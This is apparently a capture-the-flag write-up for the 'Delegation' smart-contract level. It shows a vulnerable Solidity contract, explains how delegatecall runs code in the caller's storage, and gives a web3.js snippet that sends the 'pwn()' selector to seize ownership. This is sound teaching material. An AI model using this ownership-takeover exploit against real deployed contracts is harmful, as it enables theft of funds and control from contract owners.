# 06. Delegation

The goal of this level is for you to claim ownership of the instance you are given.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

## Vulnerability

The security issue with delegate call is that you are allowing a third party contract to manipulate your own storage.
To be more precise, the called function will be executed in the caller's storage context.

So if we manage to pass the right data to the fallback function, and do a delegatecall to the pwn function we should claim ownership of the Delegate contract.

```js
let accounts = await web3.eth.requestAccounts();
let account = accounts[0];
let data = web3.eth.abi.encodeFunctionSignature("pwn()");
web3.eth.sendTransaction({to: contract.address, from: account, data: data});
```

The only important bit here is :

```js
let data = web3.eth.abi.encodeFunctionSignature("pwn()");
```

Which is simply computing the keccak256 of "pwn()" and keeping the first 4 bytes.
Thoses bytes are the function selector used inside the EVM to identify the targetted function.

So :

When the target contract receives the transaction, its fallback function is called. The fallback function delegates the call to the Delegate contract where a matching function
is found : function pwn(). This function executes and set the new owner. Since the storage of Delegation is used as we are in a delegateCall, the owner of the target contract
is changed to our personal address.